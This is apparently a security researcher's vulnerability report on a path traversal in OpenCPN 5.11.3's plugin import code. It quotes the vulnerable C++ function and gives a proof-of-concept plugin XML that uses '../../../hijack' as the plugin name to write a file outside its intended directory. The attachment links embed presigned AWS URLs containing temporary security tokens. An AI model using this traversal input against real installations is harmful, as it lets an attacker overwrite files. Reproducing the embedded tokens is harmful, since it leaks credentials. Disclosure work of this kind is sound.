---
notion_url: https://www.notion.so/325be0809830834c8c6381516f4b588c
last_synced: 2026-06-12 05:50
tags: [notion-sync]
---

# File overwrite - Path traversal report

- 📄 [[KOR OpenCPN File overwrite - Path traversal report/KOR OpenCPN File overwrite - Path traversal report|KOR OpenCPN File overwrite - Path traversal report]]

Vulnerability Title : OpenCPN File overwrite - Path traversal report
Vulnerability Summary: File overwrite due to creation of a `.meta` file without path validation
Vendor : Github OpenSource Project
Software Name : OpenCPN
Version : 5.11.3
Software Type : ECS (Electronic Chart System)
Attack Type : Path Traversal
Impact : File overwrite with process privileges
Vulnerable Source File: `Console.cpp
`
Vulnerable Function: `import_plugin()`
Vulnerable Parameter : 

```c++
metadata_path = PluginHandler::ImportedMetadataPath([metadata.name](http://metadata.name/));
```

Affected Environment: Ubuntu 24.04

Proof Of Concept  : 

While analyzing `console.cpp` inside `opencpn/cli`, in `import_plugin()`:

```c++
void import_plugin(const std::string& tarball_path) {
    auto handler = PluginHandler::GetInstance();
    PluginMetadata metadata;
    bool ok = handler->ExtractMetadata(tarball_path, metadata);
    if (!ok) {
      std::cerr << "Cannot extract metadata (malformed tarball?)\n";
      exit(2);
    }
    if (!PluginHandler::IsCompatible(metadata)) {
      std::cerr << "Incompatible plugin detected\n";
      exit(2);
    }
    ok = handler->InstallPlugin(metadata, tarball_path);
    if (!ok) {
      std::cerr << "Error extracting import plugin tarball.\n";
      exit(2);
    }
    metadata.is_imported = true;
    auto metadata_path = PluginHandler::ImportedMetadataPath(metadata.name);
    std::ofstream file(metadata_path);
    file << metadata.to_string();
    if (!file.good()) {
      std::cerr << "Error saving metadata file: " << metadata_path
                << " for imported plugin: " << metadata.name;
      exit(2);
    }
    exit(0);
  }
```


After confirming that there is no validation of the `metadata.name` path, an XML file was created for testing:

```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <plugin version="1">
      <name>../../../hijack</name>
      <version>0.0.1</version>
      <release>0</release>
      <summary>PoC</summary>
      <description>Path Traversal PoC</description>
      <target>ubuntu-x86_64</target>
      <build-target>ubuntu</build-target>
      <build-gtk>gtk3</build-gtk>
      <target-version>24.04</target-version>
      <target-arch>x86_64</target-arch>
      <api-version>1.18</api-version>
      <tarball-url>file:///nope</tarball-url>
    </plugin>
```


Inserted `..` and `/` into `<name>` to attempt path traversal:

![image](_assets/image.png)


Additional Materials (video, report attachments):

> 📎 첨부(미변환): [POC.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/b5ba704b-1446-488f-8f07-e5a8cd12e7aa/POC.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZRVKKERZ%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T205040Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJIMEYCIQCzn4oBkynz5b8nyQhTxdFT92y5IZpT%2FdVJCwCpenZC%2FQIhAP%2F7ghDVx3AFxbYNrHz3ZR%2FIs2I9%2BP%2B0CkIMEHrwSP8HKv8DCAUQABoMNjM3NDIzMTgzODA1IgzdYFIUsFbz%2BykM0toq3AOYUekftXXZ%2BOj%2BNtsEFcCrht10ISx%2Fy0X6ZC%2B%2Bx29k%2FPphFJRH%2BWYa3ajWW%2BBo2Jkem7P%2FPoDFT%2FVm6EqjJvhKpUtVzBpQnOFcH8ilF%2FN3d1NQT3I%2BbloHH26caC2zSLcz39CkIebS4EH4alwqiw5k%2BNwUPwPEfzNOi3B5aadrV58UDbO9UWS2mWtHiCptg8wl4%2F3B5gHqhv34FczpcjHbfM3T9Yv3szG2IjtXdl7fl7TddXBVU72QZuyGp33k4okFkAeXxVaIJJc%2BlvSJdam0AZNSL5lBclcrUfuhVyPYJLJ%2BOwj7jh274MA8wDVXnOcu5oTrUMfgx8ohpM%2BFJ7CQ9EK8oNwmjVytf2i7%2FiWPQMKIrk55yGcEpMm8J27JS%2B69d2CvP%2Bw229FmxJdoRIGkhUejyV%2F4RiqWzs6CoafG7cUhhd6FpxsJyL0N%2BH1aaPc6mE14mzuJKKk1%2Fwo5vx%2BOGG1aVS%2FzIkJrdHC3pTkKGzr4ymh1bNSZCTP8uESDSLACdyEbhuTj6D2xTD%2FTJM3sXlmkcRQIGKPOPs1ksEy7eg1DUoij8C2v25iRMVGSckm%2BkBqBhf8Gj4NDF0otqB7C3oNXgnqTfP1anwIC4EW9CBk9AvBtcc2WRYRqGDDfqazRBjqkAc%2B8RTUH%2Bq9HJrzCD0moLWIDZzCAi4kYFThQhO8oqzOiQY4UZsWun1nLZhvKBGMTksMxeSvoE%2F%2FrY80%2B2LLUPjf1c6NEvAdse1%2FJernat1tgI90%2Fl5r%2FiItItAoAC72qRxDc37fO4SFgHzcIjeN6LFozTBWAm2RXeM3MgmUd7ZVKYBVNG1y8fPtxRNcwIyHYtKFWufJwfu9Nrhya9QCPZs9ErBai&X-Amz-Signature=5c1576729ec24a3cf5cfdc1ee571cb739cac4d7ac2f76398a779a95a71e20f63&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)



> 📎 첨부(미변환): [zdi report1.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/906fde38-249e-4345-a05b-12f9884900fa/zdi_report1.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466ZRVKKERZ%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T205040Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJIMEYCIQCzn4oBkynz5b8nyQhTxdFT92y5IZpT%2FdVJCwCpenZC%2FQIhAP%2F7ghDVx3AFxbYNrHz3ZR%2FIs2I9%2BP%2B0CkIMEHrwSP8HKv8DCAUQABoMNjM3NDIzMTgzODA1IgzdYFIUsFbz%2BykM0toq3AOYUekftXXZ%2BOj%2BNtsEFcCrht10ISx%2Fy0X6ZC%2B%2Bx29k%2FPphFJRH%2BWYa3ajWW%2BBo2Jkem7P%2FPoDFT%2FVm6EqjJvhKpUtVzBpQnOFcH8ilF%2FN3d1NQT3I%2BbloHH26caC2zSLcz39CkIebS4EH4alwqiw5k%2BNwUPwPEfzNOi3B5aadrV58UDbO9UWS2mWtHiCptg8wl4%2F3B5gHqhv34FczpcjHbfM3T9Yv3szG2IjtXdl7fl7TddXBVU72QZuyGp33k4okFkAeXxVaIJJc%2BlvSJdam0AZNSL5lBclcrUfuhVyPYJLJ%2BOwj7jh274MA8wDVXnOcu5oTrUMfgx8ohpM%2BFJ7CQ9EK8oNwmjVytf2i7%2FiWPQMKIrk55yGcEpMm8J27JS%2B69d2CvP%2Bw229FmxJdoRIGkhUejyV%2F4RiqWzs6CoafG7cUhhd6FpxsJyL0N%2BH1aaPc6mE14mzuJKKk1%2Fwo5vx%2BOGG1aVS%2FzIkJrdHC3pTkKGzr4ymh1bNSZCTP8uESDSLACdyEbhuTj6D2xTD%2FTJM3sXlmkcRQIGKPOPs1ksEy7eg1DUoij8C2v25iRMVGSckm%2BkBqBhf8Gj4NDF0otqB7C3oNXgnqTfP1anwIC4EW9CBk9AvBtcc2WRYRqGDDfqazRBjqkAc%2B8RTUH%2Bq9HJrzCD0moLWIDZzCAi4kYFThQhO8oqzOiQY4UZsWun1nLZhvKBGMTksMxeSvoE%2F%2FrY80%2B2LLUPjf1c6NEvAdse1%2FJernat1tgI90%2Fl5r%2FiItItAoAC72qRxDc37fO4SFgHzcIjeN6LFozTBWAm2RXeM3MgmUd7ZVKYBVNG1y8fPtxRNcwIyHYtKFWufJwfu9Nrhya9QCPZs9ErBai&X-Amz-Signature=9cd381970ef83562f911cda6ce3a3096a1481b619fc093555a80bfe77552a7db&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
